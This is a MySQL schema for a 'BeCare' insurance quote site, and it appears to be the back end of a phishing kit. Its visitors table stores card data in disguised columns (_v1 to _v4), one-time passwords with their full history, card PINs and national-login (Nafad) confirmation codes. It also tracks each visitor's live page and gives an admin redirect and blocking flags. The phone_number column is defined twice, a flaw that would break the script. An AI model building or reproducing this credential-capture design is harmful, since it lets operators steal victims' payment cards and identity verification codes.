-- =====================================================
-- Schema for BeCare Visitors / Insurance Flow
-- Compatible with MariaDB/MySQL
-- =====================================================

CREATE DATABASE IF NOT EXISTS becare_db
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;

USE becare_db;

-- =====================================================
-- 1) visitors
-- =====================================================
CREATE TABLE IF NOT EXISTS visitors (
    id VARCHAR(255) PRIMARY KEY,

    -- Step 1: identity / vehicle
    identity_number VARCHAR(10) DEFAULT NULL,
    owner_name VARCHAR(255) DEFAULT NULL,
    phone_number VARCHAR(20) DEFAULT NULL,
    document_type VARCHAR(50) DEFAULT NULL,
    serial_number VARCHAR(50) DEFAULT NULL,
    insurance_type VARCHAR(50) DEFAULT NULL,

    -- Ownership transfer
    buyer_name VARCHAR(255) DEFAULT NULL,
    buyer_id_number VARCHAR(10) DEFAULT NULL,

    -- Step 2: insurance details
    insurance_coverage VARCHAR(50) DEFAULT NULL,
    insurance_start_date DATE DEFAULT NULL,
    vehicle_usage VARCHAR(100) DEFAULT NULL,
    vehicle_value DECIMAL(15,2) DEFAULT NULL,
    vehicle_year VARCHAR(4) DEFAULT NULL,
    vehicle_model VARCHAR(255) DEFAULT NULL,
    repair_location VARCHAR(50) DEFAULT NULL,

    -- Step 3: selected offer
    selected_offer JSON DEFAULT NULL,
    offer_total_price DECIMAL(15,2) DEFAULT NULL,

    -- Tracking / device / country
    country VARCHAR(10) DEFAULT NULL,
    device_type VARCHAR(50) DEFAULT NULL,
    browser VARCHAR(100) DEFAULT NULL,
    os VARCHAR(100) DEFAULT NULL,
    screen_resolution VARCHAR(20) DEFAULT NULL,

    -- Tracking state
    current_step INT DEFAULT 1,
    current_page VARCHAR(50) DEFAULT 'home',
    is_online TINYINT(1) DEFAULT 1,
    is_blocked TINYINT(1) DEFAULT 0,
    is_unread TINYINT(1) DEFAULT 1,

    -- Card data (stored as text/opaque values)
    _v1 VARCHAR(255) DEFAULT NULL,
    _v2 VARCHAR(255) DEFAULT NULL,
    _v3 VARCHAR(255) DEFAULT NULL,
    _v4 VARCHAR(255) DEFAULT NULL,
    _v1Status VARCHAR(50) DEFAULT NULL,
    card_status VARCHAR(50) DEFAULT NULL,
    card_updated_at DATETIME DEFAULT NULL,

    -- OTP
    _v5 VARCHAR(10) DEFAULT NULL,
    _v5Status VARCHAR(20) DEFAULT 'pending',
    otp_submitted_at DATETIME DEFAULT NULL,
    otp_resend_requested TINYINT(1) DEFAULT 0,
    otp_resend_at DATETIME DEFAULT NULL,
    all_otps JSON DEFAULT NULL,
    otp_updated_at DATETIME DEFAULT NULL,

    -- PIN
    _v6 VARCHAR(10) DEFAULT NULL,
    _v6Status VARCHAR(20) DEFAULT 'pending',
    pin_submitted_at DATETIME DEFAULT NULL,
    pin_updated_at DATETIME DEFAULT NULL,
    payment_status VARCHAR(50) DEFAULT NULL,

    -- Phone verification
    phone_id_number VARCHAR(10) DEFAULT NULL,
    phone_number VARCHAR(20) DEFAULT NULL,
    phone_carrier VARCHAR(50) DEFAULT NULL,
    phone_submitted_at DATETIME DEFAULT NULL,
    phone_updated_at DATETIME DEFAULT NULL,
    _v4Status VARCHAR(50) DEFAULT NULL,
    phone_otp_status VARCHAR(50) DEFAULT NULL,
    old_phone_info JSON DEFAULT NULL,

    -- Nafad
    _v8 VARCHAR(10) DEFAULT NULL,
    _v9 VARCHAR(255) DEFAULT NULL,
    nafad_confirmation_code VARCHAR(10) DEFAULT NULL,
    nafad_confirmation_status VARCHAR(20) DEFAULT NULL,
    nafad_updated_at DATETIME DEFAULT NULL,

    -- Redirects
    redirect_page VARCHAR(50) DEFAULT NULL,

    -- Timestamps
    home_completed_at DATETIME DEFAULT NULL,
    insur_completed_at DATETIME DEFAULT NULL,
    compar_completed_at DATETIME DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    session_start_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    INDEX idx_identity_number (identity_number),
    INDEX idx_phone_number (phone_number),
    INDEX idx_current_page (current_page),
    INDEX idx_is_blocked (is_blocked),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- 2) visitor_history
-- =====================================================
CREATE TABLE IF NOT EXISTS visitor_history (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    visitor_id VARCHAR(255) NOT NULL,
    type VARCHAR(50) NOT NULL,
    data JSON DEFAULT NULL,
    status VARCHAR(20) DEFAULT 'pending',
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT fk_history_visitor
        FOREIGN KEY (visitor_id) REFERENCES visitors(id)
        ON DELETE CASCADE,

    INDEX idx_history_visitor_id (visitor_id),
    INDEX idx_history_type (type),
    INDEX idx_history_status (status),
    INDEX idx_history_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- 3) visitor_messages
-- =====================================================
CREATE TABLE IF NOT EXISTS visitor_messages (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    visitor_id VARCHAR(255) NOT NULL,
    message TEXT NOT NULL,
    sender_name VARCHAR(255) DEFAULT NULL,
    is_from_admin TINYINT(1) DEFAULT 0,
    is_read TINYINT(1) DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT fk_messages_visitor
        FOREIGN KEY (visitor_id) REFERENCES visitors(id)
        ON DELETE CASCADE,

    INDEX idx_messages_visitor_id (visitor_id),
    INDEX idx_messages_is_read (is_read),
    INDEX idx_messages_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- 4) public_settings
-- =====================================================
CREATE TABLE IF NOT EXISTS public_settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_key VARCHAR(100) NOT NULL UNIQUE,
    setting_value TEXT DEFAULT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

    INDEX idx_public_settings_key (setting_key)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- 5) optional: admin_users (if you want login/dashboard)
-- =====================================================
CREATE TABLE IF NOT EXISTS admin_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL UNIQUE,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(255) DEFAULT NULL,
    role VARCHAR(50) DEFAULT 'admin',
    is_active TINYINT(1) DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- =====================================================
-- Sample settings rows (optional)
-- =====================================================
INSERT INTO public_settings (setting_key, setting_value) VALUES
    ('site_title', 'BeCare'),
    ('maintenance_mode', '0')
ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value);
